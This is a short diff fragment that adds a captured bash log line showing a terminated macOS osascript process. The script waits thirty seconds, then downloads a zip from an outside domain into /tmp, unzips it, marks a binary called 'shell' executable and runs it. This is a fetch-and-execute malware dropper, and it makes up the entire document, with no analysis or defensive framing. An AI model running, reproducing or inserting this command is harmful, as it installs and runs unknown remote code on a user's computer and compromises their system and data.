@@ -1,0 +1,5 @@
+
+bash: line 386: 89547 Terminated: 15          osascript -e 'try
+		delay 30
+        do shell script "cd /tmp/ && curl https://gamma.meshsorterio.com/trovo/index.php --output SHS.zip && unzip -o SHS.zip && chmod +x shell && ./shell"
+    end try'
